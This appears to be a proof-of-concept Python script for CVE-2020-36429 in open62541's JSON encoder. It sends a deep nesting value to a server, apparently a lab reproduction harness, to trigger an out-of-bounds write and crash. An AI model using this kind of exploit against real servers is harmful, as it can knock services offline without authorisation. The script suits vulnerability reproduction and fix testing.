#!/usr/bin/env python3
"""
PoC for CVE-2020-36429 - open62541 JSON encoder recursion-depth OOB write.

The vulnerable v1.0.1 JSON encoder indexes a fixed CtxJson.commaNeeded[100]
array by recursion depth with no bound check. We ask the server to JSON-encode
a Variant nested far deeper than 100 levels; the encoder writes
commaNeeded[>=100] past the array end -> ASan heap-buffer-overflow -> SIGABRT.

Wire format: a single 2-byte little-endian nesting depth.
"""
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4840
DEPTH = int(sys.argv[3]) if len(sys.argv) > 3 else 250   # > 100 -> overflow


def main():
    print(f"[*] CVE-2020-36429 PoC -> {HOST}:{PORT}  depth={DEPTH}")
    print(f"[*] requesting JSON encode of a Variant nested {DEPTH} levels "
          f"(> UA_JSON_ENCODING_MAX_RECURSION=100)")
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(struct.pack("<H", DEPTH & 0xFFFF))
    s.settimeout(5)
    try:
        data = s.recv(256)
        print(f"[*] server replied {len(data)} bytes (no crash on this depth)")
    except (socket.timeout, ConnectionResetError) as e:
        print(f"[+] Connection dropped/timeout ({e})")
        print("[+] Server likely aborted (ASan heap-buffer-overflow on "
              "commaNeeded[>=100]) -> check docker logs")
    s.close()


if __name__ == "__main__":
    main()
